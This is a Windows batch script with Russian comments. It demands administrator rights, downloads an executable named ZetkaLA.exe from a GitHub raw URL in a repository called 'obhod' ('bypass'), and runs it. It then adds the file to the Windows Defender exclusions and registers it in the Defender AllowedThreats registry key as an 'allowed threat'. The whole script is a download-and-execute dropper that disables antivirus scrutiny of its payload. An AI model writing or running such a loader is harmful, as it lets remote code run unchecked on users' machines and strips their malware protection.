@echo off

:: Устанавливаем кодировку для корректного отображения русских символов
chcp 65001 >nul

:: Проверка запуска от имени администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Пожалуйста, запустите этот скрипт от имени администратора!
    pause
    exit /b
)

:: Устанавливаем URL файла на GitHub
set URL=https://raw.githubusercontent.com/jester19686/obhod/main/ZetkaLA.exe

:: Указываем локальный путь для сохранения файла
set FILE_PATH=%~dp0ZetkaLA.exe

:: Скачиваем файл с помощью PowerShell
echo Скачивание файла...
powershell -Command "try { Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE_PATH%' } catch { Write-Host 'Ошибка при скачивании файла'; exit 1 }"

:: Проверяем, существует ли скачанный файл
if exist "%FILE_PATH%" (
    echo Файл успешно загружен: %FILE_PATH%
) else (
    echo Ошибка: файл не был загружен. Проверьте URL или подключение к интернету.
    pause
    exit /b 1
)

:: Запуск загруженного файла
echo Запуск загруженного файла...
start "" "%FILE_PATH%"

:: Добавление файла в исключения Windows Defender через PowerShell
echo Добавляем файл в исключения Windows Defender...
powershell -Command "try { Set-MpPreference -ExclusionPath '%FILE_PATH%' } catch { Write-Host 'Ошибка при добавлении исключения'; exit 1 }"

if %errorlevel% equ 0 (
    echo Файл успешно добавлен в исключения Windows Defender.
) else (
    echo Не удалось добавить файл в исключения Windows Defender. Проверьте права и настройки системы.
    pause
    exit /b 1
)

:: Добавление файла в список разрешённых угроз через реестр
echo Добавляем файл в список разрешенных угроз (через реестр)...
set REG_PATH=HKLM\SOFTWARE\Microsoft\Windows Defender\Threats\AllowedThreats
reg add "%REG_PATH%" /v "%FILE_PATH%" /t REG_SZ /d "Разрешенная угроза" /f

if %errorlevel% equ 0 (
    echo Файл успешно добавлен в список разрешенных угроз (через реестр).
) else (
    echo Не удалось добавить файл в список разрешенных угроз. Проверьте права и настройки системы.
    pause
    exit /b 1
)

:: Завершение
echo Операция завершена. Файл добавлен в исключения, разрешённые угрозы и запущен: %FILE_PATH%
pause
exit /b 0
